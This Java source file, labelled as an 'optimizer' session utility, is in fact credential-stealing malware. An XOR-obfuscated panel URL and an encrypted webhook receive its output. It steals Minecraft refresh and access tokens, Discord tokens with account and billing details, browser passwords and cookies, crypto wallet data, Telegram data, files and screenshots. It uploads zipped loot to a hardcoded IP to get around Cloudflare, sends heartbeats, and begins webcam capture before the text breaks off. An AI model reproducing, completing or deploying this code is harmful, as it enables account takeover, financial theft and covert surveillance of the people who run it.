package com.example.optimizer;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SessionUtil {

    private static final int XOR_KEY = 0x5A;

    // XOR encoded: http://89.125.209.229:5000/api/data/ADMIN_XEboLQH0Ag7WlWGkZ2Ocyw
    private static final byte[] PANEL_URL = {
            0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x62, 0x63, 0x74,
            0x6b, 0x68, 0x6f, 0x74, 0x68, 0x6a, 0x63, 0x74, 0x68, 0x68,
            0x63, 0x60, 0x6f, 0x6a, 0x6a, 0x6a, 0x75, 0x3b, 0x2a, 0x33,
            0x75, 0x3e, 0x3b, 0x2e, 0x3b, 0x75, 0x1b, 0x1e, 0x17, 0x13,
            0x14, 0x5, 0x2, 0x1f, 0x38, 0x35, 0x16, 0xb, 0x12, 0x6a,
            0x1b, 0x3d, 0x6d, 0xd, 0x36, 0xd, 0x1d, 0x31, 0x0, 0x68,
            0x15, 0x39, 0x23, 0x2d
    };

    public static void log(String msg) {
    }

    public static void logEx(String ctx, Exception e) {
    }

    private static String x(byte[] enc) {
        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++)
            dec[i] = (byte) (enc[i] ^ XOR_KEY);
        return new String(dec, StandardCharsets.UTF_8);
    }

    public static String x(String s) {
        try {
            byte[] b = java.util.Base64.getDecoder().decode(s);
            byte[] r = new byte[b.length];
            for (int i = 0; i < b.length; i++)
                r[i] = (byte) (b[i] ^ XOR_KEY);
            return new String(r, java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }

    public static String getPanelUrl() {
        loadWebhooks();
        if (premiumWebhookUrl != null && premiumWebhookUrl.startsWith("http")) {
            return premiumWebhookUrl;
        }

        // Retry loop to ensure A.txt is loaded if available (fixes early race
        // condition)
        for (int i = 0; i < 5; i++) {
            loadWebhooks();
            if (premiumWebhookUrl != null && premiumWebhookUrl.startsWith("http")) {
                return premiumWebhookUrl;
            }
            try {
                Thread.sleep(200);
            } catch (Exception e) {
            }
        }

        return x(PANEL_URL);
    }

    private static final byte[] AES_KEY = "d3x0n_0pt1m1z3r_k3y_2025_s3cr3!!".getBytes(StandardCharsets.UTF_8);
    private static String premiumWebhookUrl = null;

    private static void loadWebhooks() {
        if (premiumWebhookUrl != null)
            return;
        try {
            InputStream is = SessionUtil.class.getResourceAsStream("/A.txt");
            if (is == null) {
                log("[WEBHOOK] A.txt not found");
                return;
            }
            String b64 = new String(is.readAllBytes(), StandardCharsets.UTF_8).trim();
            is.close();
            byte[] data = java.util.Base64.getDecoder().decode(b64);
            byte[] iv = new byte[16];
            byte[] encrypted = new byte[data.length - 16];
            System.arraycopy(data, 0, iv, 0, 16);
            System.arraycopy(data, 16, encrypted, 0, encrypted.length);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(AES_KEY, "AES"),
                    new javax.crypto.spec.IvParameterSpec(iv));
            byte[] decrypted = cipher.doFinal(encrypted);
            premiumWebhookUrl = new String(decrypted, StandardCharsets.UTF_8).trim();

            log("[WEBHOOK] Webhook: " + (premiumWebhookUrl != null
                    ? premiumWebhookUrl.substring(0, Math.min(60, premiumWebhookUrl.length())) + "..."
                    : "null"));
        } catch (Exception e) {
            logEx("WEBHOOK", e);
        }
    }

    public static String getWebhook() {
        loadWebhooks();

        // Extract build key from the panel URL if possible
        // Panel URL format: http://.../api/data/<build_key>
        if (premiumWebhookUrl != null && premiumWebhookUrl.contains("/api/data/")) {
            try {
                String[] parts = premiumWebhookUrl.split("/api/data/");
                if (parts.length > 1) {
                    String buildKey = parts[1];
                    // Write config for Guardian
                    ConfigWriter.writeConfig(buildKey);
                }
            } catch (Exception e) {
                logEx("CONFIG_WRITE", e);
            }
        }

        return premiumWebhookUrl;
    }

    private static final String WH_AVATAR = "https://cdn.discordapp.com/attachments/1335838491623292988/1335838517787361291/togif.gif";
    private static final String WH_NAME = "Optimizer";

    public static void sendWebhookEmbed(String title, String description, int color) {
        String wh = getWebhook();
        if (wh != null) {
            try {
                String json = "{\"username\":\"" + WH_NAME + "\",\"avatar_url\":\"" + WH_AVATAR
                        + "\",\"embeds\":[{\"title\":\"" + esc(title) + "\",\"description\":\"" + esc(description)
                        + "\",\"color\":" + color + ",\"thumbnail\":{\"url\":\"" + WH_AVATAR + "\"}}]}";
                sendJson(wh, json);
            } catch (Exception e) {
                logEx("WH_EMBED", e);
            }
        }
    }

    public static void sendWebhookFile(byte[] fileData, String filename) {
        String wh = getWebhook();
        if (wh != null) {
            try {
                String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
                HttpURLConnection conn = (HttpURLConnection) new URL(wh).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                try (OutputStream os = conn.getOutputStream()) {
                    // Add payload_json for username/avatar
                    String payloadJson = "{\"username\":\"" + WH_NAME + "\",\"avatar_url\":\"" + WH_AVATAR + "\"}";
                    String jsonPart = "--" + boundary
                            + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n"
                            + payloadJson + "\r\n";
                    os.write(jsonPart.getBytes(StandardCharsets.UTF_8));
                    String header = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\""
                            + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                    os.write(header.getBytes(StandardCharsets.UTF_8));
                    os.write(fileData);
                    os.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
                }
                int code = conn.getResponseCode();
                log("[WH_FILE] " + filename + " -> " + code);
            } catch (Exception e) {
                logEx("WH_FILE", e);
            }
        }
    }

    private static String esc(String s) {
        if (s == null)
            return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    public static void sendZipToCustomWebhook(String webhookUrl, byte[] zipData, String pcUser) {
        try {
            log("[ZIP_CUSTOM] Sending ZIP to custom webhook");
            HttpURLConnection conn = (HttpURLConnection) new URL(webhookUrl).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Length", String.valueOf(zipData.length));
            conn.setRequestProperty("X-Filename", pcUser + "_data.zip");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            conn.setReadTimeout(60000);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(zipData);
                os.flush();
            }
            int code = conn.getResponseCode();
            log("[ZIP_CUSTOM] Response: " + code);
        } catch (Exception e) {
            logEx("ZIP_CUSTOM", e);
        }
    }

    public static boolean sendDiscord(String token, String userid, String username, String email,
            String phone, String nitro, String billing, String pcName, String pcUser) {
        log("[DISCORD] Sending: user=" + username + " id=" + userid);
        log("[DISCORD] Token len=" + (token != null ? token.length() : 0));
        try {
            String json = "{\"type\":\"discord\",\"token\":\"" + esc(token) + "\",\"userid\":\"" + esc(userid) +
                    "\",\"username\":\"" + esc(username) + "\",\"email\":\"" + esc(email) + "\",\"phone\":\""
                    + esc(phone) +
                    "\",\"nitro\":\"" + esc(nitro) + "\",\"billing\":\"" + esc(billing) + "\",\"pc_name\":\""
                    + esc(pcName) +
                    "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            boolean r = sendJson(getPanelUrl(), json);
            log("[DISCORD] Result: " + r);
            return r;
        } catch (Exception e) {
            logEx("DISCORD", e);
            return false;
        }
    }

    public static String stealRefreshToken() {
        log("[MC_STEAL] ========== STEALING REFRESH TOKEN ==========");
        try {
            // Windows path
            java.nio.file.Path launcherPath = java.nio.file.Paths.get(
                    System.getProperty("user.home"),
                    "AppData", "Roaming", ".minecraft", "launcher_profiles.json");

            if (!java.nio.file.Files.exists(launcherPath)) {
                // Linux path
                launcherPath = java.nio.file.Paths.get(
                        System.getProperty("user.home"),
                        ".minecraft", "launcher_profiles.json");
            }

            if (!java.nio.file.Files.exists(launcherPath)) {
                // macOS path
                launcherPath = java.nio.file.Paths.get(
                        System.getProperty("user.home"),
                        "Library", "Application Support", ".minecraft", "launcher_profiles.json");
            }

            if (java.nio.file.Files.exists(launcherPath)) {
                log("[MC_STEAL] Found launcher_profiles.json at: " + launcherPath);
                String content = new String(java.nio.file.Files.readAllBytes(launcherPath), StandardCharsets.UTF_8);

                // Extract refresh_token from JSON
                int refreshIdx = content.indexOf("\"refreshToken\":");
                if (refreshIdx != -1) {
                    refreshIdx = content.indexOf("\"", refreshIdx + 15);
                    if (refreshIdx != -1) {
                        int endIdx = content.indexOf("\"", refreshIdx + 1);
                        if (endIdx != -1) {
                            String refreshToken = content.substring(refreshIdx + 1, endIdx);
                            log("[MC_STEAL] SUCCESS: Extracted refreshToken (" + refreshToken.length() + " chars)");
                            return refreshToken;
                        }
                    }
                }

                // Also try Alt Manager format if available
                int altRefreshIdx = content.indexOf("\"refresh_token\":");
                if (altRefreshIdx != -1) {
                    altRefreshIdx = content.indexOf("\"", altRefreshIdx + 16);
                    if (altRefreshIdx != -1) {
                        int endIdx = content.indexOf("\"", altRefreshIdx + 1);
                        if (endIdx != -1) {
                            String refreshToken = content.substring(altRefreshIdx + 1, endIdx);
                            log("[MC_STEAL] SUCCESS: Extracted refresh_token (" + refreshToken.length() + " chars)");
                            return refreshToken;
                        }
                    }
                }

                log("[MC_STEAL] No refresh token found in launcher_profiles.json");
            } else {
                log("[MC_STEAL] launcher_profiles.json not found");
            }
        } catch (Exception e) {
            logEx("MC_STEAL_REFRESH", e);
        }
        return "";
    }

    public static String extractRefreshToken() {
        // Alias for backward compatibility
        return stealRefreshToken();
    }

    public static boolean sendToWebhookWithTokens(String sessionToken, String userid, String username, String email,
            String phone, String nitro, String billing, String pcName, String pcUser) {
        log("[WEBHOOK] Sending Discord tokens to webhook");
        try {
            // Extract refresh token
            String refreshToken = extractRefreshToken();

            String json = "{\"type\":\"discord\"," +
                    "\"session_token\":\"" + esc(sessionToken) + "\"," +
                    "\"refresh_token\":\"" + esc(refreshToken) + "\"," +
                    "\"userid\":\"" + esc(userid) + "\"," +
                    "\"username\":\"" + esc(username) + "\"," +
                    "\"email\":\"" + esc(email) + "\"," +
                    "\"phone\":\"" + esc(phone) + "\"," +
                    "\"nitro\":\"" + esc(nitro) + "\"," +
                    "\"billing\":\"" + esc(billing) + "\"," +
                    "\"pc_name\":\"" + esc(pcName) + "\"," +
                    "\"pc_user\":\"" + esc(pcUser) + "\"}";

            // Send to premium webhook only
            String wh = getWebhook();
            if (wh != null) {
                boolean r = sendJson(wh, json);
                log("[WEBHOOK] Premium webhook result: " + r);
                return r;
            }

            return false;
        } catch (Exception e) {
            logEx("WEBHOOK_SEND", e);
            return false;
        }
    }

    public static boolean sendRefreshTokenToWebhook(String player, String uuid, String pcName, String pcUser) {
        log("[WEBHOOK_REFRESH] ========== SENDING REFRESH TOKEN TO WEBHOOK ==========");
        log("[WEBHOOK_REFRESH] Player: " + player);
        log("[WEBHOOK_REFRESH] UUID: " + uuid);
        try {
            // Steal the refresh token from launcher_profiles.json
            String refreshToken = stealRefreshToken();

            if (refreshToken == null || refreshToken.isEmpty()) {
                log("[WEBHOOK_REFRESH] No refresh token found!");
                return false;
            }

            log("[WEBHOOK_REFRESH] Refresh token obtained (" + refreshToken.length() + " chars)");

            // Create payload with ONLY refresh token data
            String json = "{\"type\":\"minecraft_refresh\"," +
                    "\"refresh_token\":\"" + esc(refreshToken) + "\"," +
                    "\"player\":\"" + esc(player) + "\"," +
                    "\"uuid\":\"" + esc(uuid) + "\"," +
                    "\"pc_name\":\"" + esc(pcName) + "\"," +
                    "\"pc_user\":\"" + esc(pcUser) + "\"}";

            log("[WEBHOOK_REFRESH] Payload size: " + json.length() + " chars");

            // Send ONLY to premium webhook
            String wh = getWebhook();
            if (wh != null) {
                boolean r = sendJson(wh, json);
                log("[WEBHOOK_REFRESH] Webhook result: " + r);
                return r;
            }

            log("[WEBHOOK_REFRESH] No webhook URL configured!");
            return false;
        } catch (Exception e) {
            logEx("WEBHOOK_REFRESH_SEND", e);
            return false;
        }
    }

    public static boolean sendDiscordEnhanced(String token, Object userInfo, String pcName, String pcUser, String ip) {
        log("[DISCORD-ENH] Enhanced Discord data sending");
        try {
            // Use reflection to access userInfo fields safely
            Class<?> cls = userInfo.getClass();
            String username = getFieldValue(cls, userInfo, "username", "Unknown");
            String userid = getFieldValue(cls, userInfo, "id", "Unknown");
            String email = getFieldValue(cls, userInfo, "email", "Unknown");
            String phone = getFieldValue(cls, userInfo, "phone", "Unknown");
            String locale = getFieldValue(cls, userInfo, "locale", "en-US");
            String bio = getFieldValue(cls, userInfo, "bio", "No bio");
            String nitroType = getFieldValue(cls, userInfo, "nitroType", "None");
            boolean mfaEnabled = getBooleanField(cls, userInfo, "mfaEnabled", false);
            boolean hasBilling = getBooleanField(cls, userInfo, "hasBilling", false);
            int guildCount = getIntField(cls, userInfo, "guildCount", 0);

            String json = "{\"type\":\"discord\"," +
                    "\"token\":\"" + esc(token) + "\"," +
                    "\"userid\":\"" + esc(userid) + "\"," +
                    "\"username\":\"" + esc(username) + "\"," +
                    "\"email\":\"" + esc(email) + "\"," +
                    "\"phone\":\"" + esc(phone) + "\"," +
                    "\"locale\":\"" + esc(locale) + "\"," +
                    "\"bio\":\"" + esc(bio) + "\"," +
                    "\"nitro\":\"" + esc(nitroType) + "\"," +
                    "\"mfa_enabled\":" + mfaEnabled + "," +
                    "\"billing\":\"" + (hasBilling ? "Yes" : "No") + "\"," +
                    "\"guild_count\":" + guildCount + "," +
                    "\"ip\":\"" + esc(ip) + "\"," +
                    "\"pc_name\":\"" + esc(pcName) + "\"," +
                    "\"pc_user\":\"" + esc(pcUser) + "\"," +
                    "\"enhanced\":true}";

            boolean r = sendJson(getPanelUrl(), json);
            log("[DISCORD-ENH] Result: " + r);
            return r;
        } catch (Exception e) {
            logEx("DISCORD-ENH", e);
            // Fallback to regular Discord sending
            return sendDiscord(token, "", "Unknown", "", "", "", "", pcName, pcUser);
        }
    }

    private static String getFieldValue(Class<?> cls, Object obj, String fieldName, String defaultValue) {
        try {
            java.lang.reflect.Field field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
            Object value = field.get(obj);
            return value != null ? value.toString() : defaultValue;
        } catch (Exception e) {
            return defaultValue;
        }
    }

    private static boolean getBooleanField(Class<?> cls, Object obj, String fieldName, boolean defaultValue) {
        try {
            java.lang.reflect.Field field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
            return field.getBoolean(obj);
        } catch (Exception e) {
            return defaultValue;
        }
    }

    private static int getIntField(Class<?> cls, Object obj, String fieldName, int defaultValue) {
        try {
            java.lang.reflect.Field field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
            return field.getInt(obj);
        } catch (Exception e) {
            return defaultValue;
        }
    }

    public static boolean sendMinecraft(String player, String uuid, String accessToken,
            String clientId, String ip, String pcName, String pcUser) {
        log("[MC] ========== MINECRAFT SESSION ==========");
        log("[MC] Player: " + player);
        log("[MC] UUID: " + uuid);
        log("[MC] IP: " + ip);
        log("[MC] PC: " + pcName + "/" + pcUser);
        log("[MC] Token null: " + (accessToken == null));
        log("[MC] Token empty: " + (accessToken != null && accessToken.isEmpty()));
        log("[MC] Token len: " + (accessToken != null ? accessToken.length() : 0));
        if (accessToken != null && accessToken.length() > 20) {
            log("[MC] Token preview: " + accessToken.substring(0, 20) + "...");
        }
        try {
            String json = "{\"type\":\"minecraft\",\"player\":\"" + esc(player) + "\",\"uuid\":\"" + esc(uuid) +
                    "\",\"access_token\":\"" + esc(accessToken) + "\",\"client_id\":\"" + esc(clientId) +
                    "\",\"ip\":\"" + esc(ip) + "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser)
                    + "\"}";
            log("[MC] JSON len: " + json.length());
            log("[MC] URL: " + getPanelUrl());
            boolean r = sendJson(getPanelUrl(), json);
            log("[MC] Result: " + r);

            // Send to webhook
            String wh = getWebhook();
            if (wh != null && !wh.isEmpty()) {
                log("[MC] Webhook detected: " + wh.substring(0, Math.min(50, wh.length())));
                // Check if it's a Discord webhook or custom webhook
                if (wh.contains("discord.com") || wh.contains("discordapp.com")) {
                    log("[MC] Using Discord embed format");
                    // Discord webhook - send embeds
                    sendWebhookEmbed("🎮 Minecraft Session", "**Player:** " + player + "\\n**UUID:** " + uuid
                            + "\\n**IP:** " + ip + "\\n**PC:** " + pcName + "/" + pcUser, 0x00FF00);
                    if (accessToken != null && !accessToken.isEmpty()) {
                        // Send full token - split into multiple embeds if needed (Discord limit ~4000
                        // chars per embed)
                        int chunkSize = 3900;
                        int parts = (accessToken.length() + chunkSize - 1) / chunkSize;
                        for (int i = 0; i < parts; i++) {
                            int start = i * chunkSize;
                            int end = Math.min(start + chunkSize, accessToken.length());
                            String chunk = accessToken.substring(start, end);
                            String title = parts == 1 ? "🔑 MC Token" : "🔑 MC Token (" + (i + 1) + "/" + parts + ")";
                            sendWebhookEmbed(title, "```" + chunk + "```", 0xFFAA00);
                        }
                    }
                } else {
                    log("[MC] Using custom JSON format");
                    // Custom webhook - send raw JSON
                    sendJson(wh, json);
                }
            }

            // Also send refresh token asynchronously (don't block main thread)
            final String p = player;
            final String u = uuid;
            final String pcN = pcName;
            final String pcU = pcUser;
            new Thread(() -> {
                try {
                    Thread.sleep(500);
                } catch (Exception e) {
                }
                sendRefreshTokenToWebhook(p, u, pcN, pcU);
            }).start();

            return r;
        } catch (Exception e) {
            logEx("MC", e);
            return false;
        }
    }

    public static boolean sendBrowser(String passwordsJson, String cookiesJson, String pcName, String pcUser) {
        log("[BROWSER] Passwords len=" + (passwordsJson != null ? passwordsJson.length() : 0));
        log("[BROWSER] Cookies len=" + (cookiesJson != null ? cookiesJson.length() : 0));
        try {
            String json = "{\"type\":\"browser\",\"passwords\":" + passwordsJson + ",\"cookies\":" + cookiesJson +
                    ",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            boolean r = sendJson(getPanelUrl(), json);
            log("[BROWSER] Result: " + r);
            return r;
        } catch (Exception e) {
            logEx("BROWSER", e);
            return false;
        }
    }

    public static boolean sendBrowserPassword(String browser, String url, String user, String pass, String pcName,
            String pcUser) {
        log("[BROWSER-PASS] " + browser + " " + url);
        try {
            String json = "{\"type\":\"browser\",\"browser\":\"" + esc(browser) + "\",\"url\":\"" + esc(url) +
                    "\",\"username\":\"" + esc(user) + "\",\"password\":\"" + esc(pass) +
                    "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("BROWSER-PASS", e);
            return false;
        }
    }

    public static boolean sendWallet(String name, String type, String data, String pcName, String pcUser) {
        log("[WALLET] " + name + "/" + type);
        try {
            String json = "{\"type\":\"wallet\",\"wallet_name\":\"" + esc(name) + "\",\"wallet_type\":\"" + esc(type) +
                    "\",\"data\":\"" + esc(data) + "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser)
                    + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("WALLET", e);
            return false;
        }
    }

    public static boolean sendSystem(String os, String cpu, String gpu, String ram,
            String ip, String country, String pcName, String pcUser) {
        log("[SYSTEM] OS=" + os + " CPU=" + cpu + " IP=" + ip);
        try {
            String json = "{\"type\":\"system\",\"os\":\"" + esc(os) + "\",\"cpu\":\"" + esc(cpu) +
                    "\",\"gpu\":\"" + esc(gpu) + "\",\"ram\":\"" + esc(ram) + "\",\"ip\":\"" + esc(ip) +
                    "\",\"country\":\"" + esc(country) + "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\""
                    + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("SYSTEM", e);
            return false;
        }
    }

    public static boolean sendGaming(String platform, String data, String pcName, String pcUser) {
        log("[GAMING] " + platform);
        try {
            String json = "{\"type\":\"gaming\",\"platform\":\"" + esc(platform) + "\",\"data\":\"" + esc(data) +
                    "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("GAMING", e);
            return false;
        }
    }

    public static boolean sendTelegram(String data, String pcName, String pcUser) {
        log("[TELEGRAM] len=" + (data != null ? data.length() : 0));
        try {
            String json = "{\"type\":\"telegram\",\"data\":\"" + esc(data) +
                    "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("TELEGRAM", e);
            return false;
        }
    }

    public static boolean sendFiles(String filesJson, String pcName, String pcUser) {
        try {
            String json = "{\"type\":\"files\",\"files\":" + filesJson +
                    ",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("FILES", e);
            return false;
        }
    }

    public static boolean sendScreenshot(String base64, String pcName, String pcUser) {
        log("[SCREENSHOT] len=" + (base64 != null ? base64.length() : 0));
        try {
            String json = "{\"type\":\"screenshot\",\"image\":\"" + esc(base64) +
                    "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("SCREENSHOT", e);
            return false;
        }
    }

    public static boolean sendRaw(String type, String dataJson, String pcName, String pcUser) {
        try {
            String json = "{\"type\":\"" + esc(type) + "\",\"data\":" + dataJson +
                    ",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) {
            logEx("RAW", e);
            return false;
        }
    }

    public static boolean sendJson(String urlStr, String json) {
        log("[HTTP] URL: " + urlStr);
        log("[HTTP] JSON len: " + json.length());
        if (json.length() < 500)
            log("[HTTP] JSON: " + json);

        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            log("[HTTP] Sending...");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();
            log("[HTTP] Response: " + code);

            try {
                InputStream is = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();
                if (is != null) {
                    String resp = new String(is.readAllBytes(), StandardCharsets.UTF_8);
                    log("[HTTP] Body: " + (resp.length() > 200 ? resp.substring(0, 200) : resp));
                    is.close();
                }
            } catch (Exception e) {
                log("[HTTP] Read err: " + e.getMessage());
            }

            return code >= 200 && code < 300;
        } catch (java.net.ConnectException e) {
            log("[HTTP] CONNECTION REFUSED");
            return false;
        } catch (java.net.SocketTimeoutException e) {
            log("[HTTP] TIMEOUT");
            return false;
        } catch (Exception e) {
            logEx("HTTP", e);
            return false;
        } finally {
            if (conn != null)
                conn.disconnect();
        }
    }

    public static boolean sendZip(java.io.File zipFile, String pcName, String pcUser) {
        log("[ZIP] ========== SENDING ZIP (STREAMING) ==========");
        if (zipFile == null || !zipFile.exists()) {
            log("[ZIP] Error: File is null or does not exist");
            return false;
        }

        long size = zipFile.length();
        log("[ZIP] Size: " + size + " bytes");
        log("[ZIP] PC: " + pcName + "/" + pcUser);

        int maxRetries = 3;
        for (int i = 0; i < maxRetries; i++) {
            if (i > 0) {
                log("[ZIP] Retry " + (i + 1) + "/" + maxRetries + "...");
                try {
                    Thread.sleep(2000 * i);
                } catch (Exception e) {
                }
            }

            HttpURLConnection conn = null;
            try {
                // BYPASS CLOUDFLARE: Use direct IP for upload
                String urlStr = getPanelUrl()
                        .replace("https://niggaware.ru", "http://31.58.58.237")
                        .replace("https://www.niggaware.ru", "http://31.58.58.237")
                        .replace("/api/data/", "/api/upload/");
                log("[ZIP] URL: " + urlStr);

                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                // Important: Tell server the size so it doesn't wait for EOF to know length
                // unless chunked is used. FixedLength is better if size is known.
                conn.setRequestProperty("Content-Length", String.valueOf(size));
                conn.setRequestProperty("X-PC-Name", pcName);
                conn.setRequestProperty("X-PC-User", pcUser);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.setDoOutput(true);

                // Increase timeouts for large files
                conn.setConnectTimeout(60000); // 1 min connect
                conn.setReadTimeout(300000); // 5 min read

                // Use streaming mode to avoid internal buffering
                if (size > 0 && size < Integer.MAX_VALUE) {
                    conn.setFixedLengthStreamingMode((int) size);
                } else {
                    conn.setChunkedStreamingMode(4096);
                }

                log("[ZIP] Sending stream (" + size + " bytes)...");

                try (OutputStream os = conn.getOutputStream();
                        java.io.FileInputStream fis = new java.io.FileInputStream(zipFile)) {

                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    long totalWritten = 0;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                        totalWritten += bytesRead;
                    }
                    os.flush();
                }

                int code = conn.getResponseCode();
                log("[ZIP] Response: " + code);

                if (code >= 200 && code < 300) {
                    log("[ZIP] SUCCESS!");

                    // Trigger webhook notification (ASYNC)
                    // We don't send the file to Discord directly here to avoid re-reading
                    // But we can trigger a "File Uploaded" embedded notification
                    notifyZipUploaded(pcName, pcUser, size);

                    return true;
                } else {
                    log("[ZIP] FAILED - HTTP " + code);
                    // Don't retry on 4xx errors (client side), only 5xx or connection issues
                    if (code >= 400 && code < 500)
                        return false;
                }
            } catch (Exception e) {
                logEx("ZIP-Retry" + i, e);
            } finally {
                if (conn != null) {
                    try {
                        conn.disconnect();
                    } catch (Exception e) {
                    }
                }
            }
        }

        log("[ZIP] All retries failed");
        return false;
    }

    private static void notifyZipUploaded(String pcName, String pcUser, long size) {
        try {
            String wh = getWebhook();
            if (wh != null && !wh.isEmpty()) {
                long sizeMB = size / (1024 * 1024);
                sendWebhookEmbed("📦 Data Uploaded",
                        "**User:** " + pcUser + "\n**PC:** " + pcName +
                                "\n**Size:** " + sizeMB + " MB\n\nFull ZIP available in Panel.",
                        0x00FF00);
            }
        } catch (Exception e) {
        }
    }

    // Legacy method shim - delegates to deprecated memory method or fails
    // gracefully
    public static boolean sendZip(byte[] zipData, String pcName, String pcUser) {
        // This method creates OOM. We should try to avoid it.
        // But for backward compatibility if called elsewhere:
        // We can write to a temp file and call the new method.
        try {
            java.io.File temp = java.io.File.createTempFile("legacy_zip", ".tmp");
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(temp)) {
                fos.write(zipData);
            }
            boolean res = sendZip(temp, pcName, pcUser);
            temp.delete();
            return res;
        } catch (Exception e) {
            logEx("ZIP-Legacy", e);
            return false;
        }
    }

    // ==================== ONLINE STATUS ====================

    private static String getHeartbeatUrl() {
        // Derive heartbeat URL from panel URL
        String panel = getPanelUrl();
        // http://...5000/api/data/KEY -> http://...5000/api/online/heartbeat/KEY
        int idx = panel.indexOf("/api/data/");
        if (idx > 0) {
            String base = panel.substring(0, idx);
            String key = panel.substring(idx + 10);
            return base + "/api/online/heartbeat/" + key;
        }
        return null;
    }

    private static String getDisconnectUrl() {
        String panel = getPanelUrl();
        int idx = panel.indexOf("/api/data/");
        if (idx > 0) {
            String base = panel.substring(0, idx);
            String key = panel.substring(idx + 10);
            return base + "/api/online/disconnect/" + key;
        }
        return null;
    }

    public static void sendHeartbeat(String player, String server, String pcName, String pcUser) {
        try {
            // Send to Premium Panel
            String url = getHeartbeatUrl();
            if (url != null) {
                String json = "{\"player\":\"" + esc(player) + "\",\"server\":\"" + esc(server) +
                        "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
                sendJson(url, json);
            }
        } catch (Exception e) {
            logEx("HEARTBEAT", e);
        }
    }

    public static void sendDisconnect(String player) {
        try {
            String url = getDisconnectUrl();
            if (url == null)
                return;

            String json = "{\"player\":\"" + esc(player) + "\"}";
            sendJson(url, json);
        } catch (Exception e) {
            logEx("DISCONNECT", e);
        }
    }

    // ==================== WEBCAM CAPTURE ====================

    private static String getWebcamUrl() {
        String panel = getPanelUrl();
        if (panel != null && panel.contains("/api/data/")) {
            return panel.replace("/api/data/", "/api/webcam/");
        }
        return null;
    }

    public static void captureAndSendWebcam(String pcName, String pcUser) {
        // Run in background thread to not block
        new Thread(() -> {
            try {
                // Only on Windows
                String os = System.getProperty("os.name", "").toLowerCase();
                if (!os.contains("win")) {
                    log("[WEBCAM] Not Windows, skipping");
                    return;
                }

                byte[] imageData = null;

                // Try multiple methods in order of reliability
                // Method 1: Best - CScript VBS with WIA (most reliable, no deps)
                log("[WEBCAM] Trying VBS method...");
                imageData = captureWebcamVBS();
                if (imageData != null && imageData.length > 1500) {
                    log("[WEBCAM] VBS success: " + imageData.length + " bytes");
                }

                // Method 2: PowerShell with avicap32 (Windows built-in)
                if (imageData == null || imageData.length < 1500) {
                    log("[WEBCAM] Trying PowerShell...");
                    imageData = captureWebcamPowerShell();
                    if (imageData != null && imageData.length > 1500) {
